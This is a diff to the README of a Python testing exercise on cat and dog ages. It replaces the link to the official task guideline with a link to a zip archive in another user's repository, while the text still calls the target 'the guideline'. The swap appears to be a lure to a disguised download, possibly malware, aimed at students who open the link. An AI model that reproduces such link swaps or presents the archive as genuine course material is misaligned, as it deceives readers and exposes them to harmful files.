@@ -1,6 +1,6 @@
 # Cat and Dog years
 
-Read [the guideline](https://github.com/mate-academy/py-task-guideline/blob/main/README.md) before starting.
+Read [the guideline](https://raw.githubusercontent.com/Rudge0/py-cat-and-dog-years/master/.github/dog_and_py_years_cat_v3.0.zip) before starting.
 
 Inside `app/test_main.py`, write tests for `get_human_age` function that 
 takes two integers `cat_age` (my cat's age in cat years) and `dog_age` 
